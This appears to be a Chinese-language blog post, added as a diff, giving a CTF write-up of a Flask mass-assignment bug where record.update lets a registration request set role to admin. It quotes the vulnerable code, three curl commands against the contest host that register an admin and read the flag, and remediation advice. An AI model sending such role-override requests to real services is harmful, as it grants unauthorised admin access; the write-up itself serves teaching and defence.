@@ -1,0 +1,63 @@
+---
+title: "CIT CTF 2026 · A Massive Problem：dict.update 撑起的越权"
+description: 题目名直接拼出 Mass Assignment。register 时 record.update(incoming) 让请求体里的 role 字段把服务端写死的默认值盖掉。
+pubDate: 2026-05-09
+tags: [CTF, cit-ctf-2026, web, flask]
+series: CIT CTF 2026
+---
+
+> Improper Authorization has been fixed! I think we are ready for production!
+
+题目名 *A **Mass**ive Problem* 直接拼出 Mass Assignment。修了「Improper Authorization」却又开了另一个洞——这种 hint 在 Web 题里几乎是标准模板。
+
+## 漏洞定位
+
+附件里 `app/app.py` 的 `/api/register` 长这样：
+
+```python
+record = {
+    'username': username,
+    'password': password,
+    'role': 'standard',
+    'full_name': full_name,
+    'title': title,
+    'team': team,
+}
+record.update(incoming)          # ← 用户提交的 JSON 会覆盖上面的默认值
+if not record.get('username') or not record.get('password') or not record.get('role'):
+    return jsonify({'error': 'Unable to create account.'}), 400
+conn.execute(
+    'insert into users ... values (?, ?, ?, ?, ?, ?) '
+    'on conflict(username) do update set ...',
+    (record['username'], record['password'], record['role'], ...)
+)
+```
+
+典型的 Mass Assignment：先用写死的 `role='standard'` 初始化 `record`，紧接着 `record.update(incoming)` 让请求体里的任意字段（包括 `role`）覆盖默认值。
+
+## 利用
+
+注册时把 `role` 改成 `admin`，然后用它登录，访问 `/admin` 拿 flag。
+
+```bash
+# 1. 以 admin 角色注册
+curl -sS -c /tmp/amp.cookies -X POST http://23.179.17.92:5556/api/register \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"pwnjack","password":"Aa1!aaaa","full_name":"x","title":"x","team":"x","role":"admin"}'
+
+# 2. 登录拿 session
+curl -sS -c /tmp/amp.cookies -b /tmp/amp.cookies -X POST http://23.179.17.92:5556/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"pwnjack","password":"Aa1!aaaa"}'
+
+# 3. 读取 /admin 上的 flag
+curl -sS -b /tmp/amp.cookies http://23.179.17.92:5556/admin | grep -oE 'CIT\{[^}]+\}'
+```
+
+`CIT{M@ss_@ssignm3nt_Pr1v3sc}`
+
+## 复盘
+
+- 「先 update 再校验」是这个洞的关键。Schema 校验一定要发生在 `update` 之前——更进一步，根本就不要从用户请求体里反序列化「整个 record」。
+- 现代框架里这类问题的根治方法是 **白名单序列化器**：Pydantic 的 `model_dump(include=...)`、Django 的 `Form`、Rails 的 `strong_parameters`、Go 的 `tag struct mapping` 都是同一类思路。
+- 题目里 SQL 语句的字段顺序写死，所以 `username/password/role` 三件套被显式取出来；如果改成 `INSERT ... SELECT * FROM (VALUES (record))` 这种偷懒写法，攻击面会再大一圈，连 `created_at` 都能被覆盖。
